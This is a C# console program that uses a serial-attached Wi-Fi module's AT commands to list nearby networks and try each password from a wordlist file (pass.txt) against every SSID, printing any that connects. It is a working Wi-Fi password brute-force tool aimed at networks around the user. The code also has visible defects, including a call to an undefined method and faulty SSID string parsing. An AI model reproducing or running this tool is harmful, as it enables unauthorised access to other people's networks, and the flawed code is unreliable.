using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO.Ports;
using System.Threading;
using System.IO;

namespace ConsoleApp5
{
    class Program
    {
        static SerialPort port;
        static void Main(string[] args)
        {
            search_serial();
        }
        static void search_serial()
        {
            string[] myPorts = SerialPort.GetPortNames();
            foreach (var port_number in myPorts)
            {
                Console.WriteLine("Find port:{0}", port_number);
            }
            choose_port();
        }
        /*
            choose your Serial port Ex:com1„ÄÅcom2
            also choose mode 
            1--AT commands
            2--start log in ssid and password
        */
        static void choose_port()
        {
            Console.WriteLine("choose port");
            port = new SerialPort(Console.ReadLine(), 9600, Parity.None, 8, StopBits.One);
            port.Open();
            Console.WriteLine("port OPEN and chooe mode");
            switch (Console.ReadLine())
            {
                case "1":
                    Console.WriteLine("choose AT cmd");
                    AT_cmd();
                    break;
                case "2":
                    Console.WriteLine("start work");
                    string currentline,cmd_str;
                    foreach (var ssidname in SSID_anme())
                    {
                        StreamReader f = new StreamReader("pass.txt");

                        while((currentline = f.ReadLine()) != null)
                        {
                            string cwjap;
                            cwjap = "AT+CWJAP=\"" + ssidname + "\",\"" + currentline + "\"";
                            Console.WriteLine(cwjap);
                            port.Write(cwjap + "\r\n");
                            Thread.Sleep(16000);
                            /*
                                test time from entre AT+CWJAP to return "OK" or "ERROR" need about 15000ms~16000ms 
                                if time not enought it will return "busy p......"
                            */
                            cmd_str = port.ReadExisting();
                            if (cmd_str.Contains("OK"))
                            {
                                Console.WriteLine("successd SSID:{0} PASS:{1}", ssidname, currentline);
                                break;
                            }

                        }
                    }
                    break;
            }
        }
        /*
            here just like arduino Serial Monitor
            
            when it's in the AT cmd mode,you can enter "AT EXIT" and return for exit at comnmands mode
        */
        static void AT_cmd()
        {
            String atcmd_string;
            while (1 == 1)
            {
                Console.WriteLine(port.ReadExisting());
                atcmd_string = Console.ReadLine();
                if (atcmd_string == "AT EXIT")
                {
                    break;
                }
                port.Write(atcmd_string + "\r\n");
                Thread.Sleep(4000);
            }
            port.Close();
            find_port();
        }
        /*
            here will erter AT commends :AT+CWLAP (find wifi near here)
            and it will return the ssid near here
        */
        static List<string> SSID_anme()
        {
            string[] condition = new string[1] { "+CWLAP:(" },str1;
            List<string> ssid = new List<string>();
            string str2;

            port.WriteLine("AT+CWLAP" + "\r\n");
            Thread.Sleep(3000);
            str2 = port.ReadExisting();
            Console.WriteLine(str2);

            str1 = str2.Split(condition, System.StringSplitOptions.RemoveEmptyEntries);
            foreach (var str in str1)
            {
                for (int i = 1; i <= str1.GetUpperBound(0); i++)
                {
                    Int16 count = 0;
                    int count_head = 0;
                    for (int j = 0; j<= str1[i].Count(); j++)
                    {
                        if (str1[i].Substring(j, 1).Equals("\""))
                        {
                            count++;
                            if (count == 1)
                            {
                                count_head = j;
                            }
                            if (count == 2)
                            {
                                ssid.Add(str1[i].Substring(count_head + 1, j - 3));
                                break;
                            }
                        }
                    }
                }
                break;
            }
            return ssid;
        }
    }
}
